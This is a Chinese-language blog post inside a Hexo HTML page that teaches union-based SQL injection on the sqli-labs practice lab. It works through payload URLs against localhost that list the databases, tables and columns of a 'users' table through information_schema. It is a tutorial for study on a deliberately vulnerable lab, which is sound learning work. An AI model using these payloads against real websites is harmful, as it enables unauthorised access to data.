@@ -1,0 +1,195 @@
+
+<!DOCTYPE html>
+<html lang="zh-CN" class="loading">
+<head><meta name="generator" content="Hexo 3.8.0">
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <meta name="viewport" content="width=device-width, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>sql注入 - Hexo</title>
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="google" content="notranslate">
+    <meta name="keywords" content="npmlab,"> 
+    <meta name="description" content="既然说到sql注入，那就不得不来科普一波这项技能的原理了。这里就不解释那么多繁杂的书面语了。通俗的说，就是在访问网站的时候网站会根据你的输入向他所连接的数据库进行查询，这时，你就能根据网站向数据库进,"> 
+    <meta name="author" content="John Doe"> 
+    <link rel="alternative" href="atom.xml" title="Hexo" type="application/atom+xml"> 
+    
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+    <link rel="stylesheet" href="/css/diaspora.css">
+    <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+    <script>
+         (adsbygoogle = window.adsbygoogle || []).push({
+              google_ad_client: "ca-pub-8691406134231910",
+              enable_page_level_ads: true
+         });
+    </script>
+    <script async custom-element="amp-auto-ads" src="https://cdn.ampproject.org/v0/amp-auto-ads-0.1.js">
+    </script>
+</head>
+</html>
+<body class="loading">
+    <span id="config-title" style="display:none">Hexo</span>
+    <div id="loader"></div>
+    <div id="single">
+    <div id="top" style="display: block;">
+    <div class="bar" style="width: 0;"></div>
+    <a class="icon-home image-icon" href="javascript:;" data-url="http://yoursite.com"></a>
+    <div title="播放/暂停" class="icon-play"></div>
+    <h3 class="subtitle">sql注入</h3>
+    <div class="social">
+        <!--<div class="like-icon">-->
+            <!--<a href="javascript:;" class="likeThis active"><span class="icon-like"></span><span class="count">76</span></a>-->
+        <!--</div>-->
+        <div>
+            <div class="share">
+                <a title="获取二维码" class="icon-scan" href="javascript:;"></a>
+            </div>
+            <div id="qr"></div>
+        </div>
+    </div>
+    <div class="scrollbar"></div>
+</div>
+
+    <div class="section">
+        <div class="article">
+    <div class="main">
+        <h1 class="title">sql注入</h1>
+        <div class="stuff">
+            <span>三月 30, 2019</span>
+            
+
+        </div>
+        <div class="content markdown">
+            <p><strong>既然说到sql注入，那就不得不来科普一波这项技能的原理了。<br>这里就不解释那么多繁杂的书面语了。通俗的说，就是在访问网站的时候<br>网站会根据你的输入向他所连接的数据库进行查询，这时，你就能根据网站向数据库进行查询的规律<br>拼凑恶意的查询语句，混入他的查询语句中，通过界面对你查询的反馈 ，从而输出你所需要的数据</strong>。</p>
+<p><strong>话不多说，我们直接进入主题</strong></p>
+<p>在讲具体解法之前先介绍一些函数以及语句的用途。</p>
+<p><code>ID=1，2，3……</code></p>
+<p>可以根据页面的反馈测试该表下的字段有多少列；</p>
+<p><code>order by</code></p>
+<p>函数可以测试当前该列表有几个字段；</p>
+<p><code>union select 1,2,3,.....</code></p>
+<p>联合查询<br><em>(ps:若果要使union的查询显示在界面中，要先使union的左边条件为错误，这样可以使反馈的字段只显示你所需要的查询结果）</em><br>可以测试该列表的回显的是哪几个字段</p>
+<p>union select 1,group_concat(你所要显示排序的表名),3 from 该表的路径</p>
+<p>数据库的路径包括–数据库的名称– 数据库下你所查询数据表的名字</p>
+<pre><code>union select 1,database()3,from xxxxx
+</code></pre><p>from后输入mysql系统自带的储存数据库名称的表名<br>可回显当前的页面数据所在的数据库名称</p>
+<p>group_concat(xxx)</p>
+<p>该函数的作用是将括号内填入的表内数据进行排序</p>
+<p>这里不得不提到mysql自带的数据库information_schema下的几个表了，可以说这是这次注入比较关键的点。</p>
+<p><strong><em>schemata表</em></strong></p>
+<p>该表存放着mysql数据库下的所有库的信息，show databases命令就是来自该表；<br>schema_name、default_character_set_name等几个重要的列也是属于该表的；<br>其中schema_name存放着的就是mysql数据库下所有的库的名字；</p>
+<p><strong><em>table表</em></strong></p>
+<p>table表，该表存放了关于所有表的信息，比较重要的是table_name;table_schema;<br>一个是存放表所属于的数据库的信息的（就是表属于哪个数据库），另一个存放的是所有表的名字（爆数据就用该该表）；</p>
+<p><strong><em>columns表    </em></strong></p>
+<p>重要的是三个列，<br>table_schema:字段所属的数据库的名字；<br>table_name：字段所属的数据表的名字；<br>column_name:字段的名字；</p>
+<p>记住这几个表，对注入非常有帮助。</p>
+<hr>
+<p>基础原理已经了解的差不多了，是时候上手试一试了</p>
+<p>下面的内容都是在sqli-labs的前几关进行的，那么我们先来试一试sql的显错注入</p>
+<p>先在id上进行回显的测试<br>一般来说就是id=1 , id=’ ,id=1’ </p>
+<pre><code>http://localhost/sql/less-1?id=1&apos; and 1=2  union select 1, group_concat(table_name),3 from information_schema.tables--+
+</code></pre><p><strong>查询tables里table_name的内容</strong></p>
+<pre><code>http://localhost/sql/less-1?id=1&apos; and 1=2  union select 1, group_concat(table_schema),3 from information_schema.tables--+
+</code></pre><p><strong>查询表所属的数据库名称</strong></p>
+<pre><code>http://localhost/sql/less-1?id=1&apos; and 1=2  union select 1, group_concat(schema_name),3 from information_schema.schemata--+
+</code></pre><p><strong>查询所有数据库的名称</strong></p>
+<pre><code>http://localhost/sql/less-1?id=1&apos; and 1=2  union select 1, database(),3 from information_schema.schemata--+
+</code></pre><p><strong>查询表所属的数据库的名称</strong></p>
+<pre><code>http://localhost/sql/less-1?id=1&apos; and 1=2  union select 1, group_concat(table_name),3 from information_schema.tables where table_schema=&apos;security&apos;--+
+</code></pre><p><strong>查询该数据库中的表的名称 然后进行排序 where后添加查询的条件  比如：在哪个表下查询=‘查询的内容’</strong></p>
+<pre><code>http://localhost/sql/less-1?id=1&apos; and 1=2  union select 1, group_concat(column_name),3 from information_schema.columns where table_name=&apos;users&apos;--+
+</code></pre><p><strong>查询该数据库中 表的字段名字 </strong></p>
+<p>于是我们就可以通过上述的例子或者是根据这样的查询语法得出该数据库更多的有价值的信息。</p>
+<p>（ps:union select 联合查询左右要进行平衡) </p>
+
+            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
+            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="true">
+                <source type="audio/mpeg" src>
+            </audio>
+            
+                <ul id="audio-list" style="display:none">
+                    
+                        <li title="0" data-url="http://music.163.com/m/song?id=139774&userid=1807882623"></li>
+                    
+                        <li title="1" data-url="http://music.163.com/m/song?id=139774&userid=1807882623"></li>
+                    
+                </ul>
+            
+        </div>
+        
+    <div id="gitalk-container" class="comment link" data-ae="false" data-ci data-cs data-r data-o data-a="npmlab" data-d="false">查看评论</div>
+
+
+    </div>
+    
+        <div class="side">
+            
+        </div>
+    
+</div>
+
+
+    </div>
+</div>
+</body>
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
+<script src="/js/plugin.js"></script>
+<script src="/js/diaspora.js"></script>
+<link rel="stylesheet" href="/photoswipe/photoswipe.css">
+<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
+<script src="/photoswipe/photoswipe.min.js"></script>
+<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
+
+<!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+            <div class="pswp__top-bar">
+                <!--  Controls are self-explanatory. Order can be changed. -->
+                <div class="pswp__counter"></div>
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                      <div class="pswp__preloader__cut">
+                        <div class="pswp__preloader__donut"></div>
+                      </div>
+                    </div>
+                </div>
+            </div>
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div> 
+            </div>
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+</html>
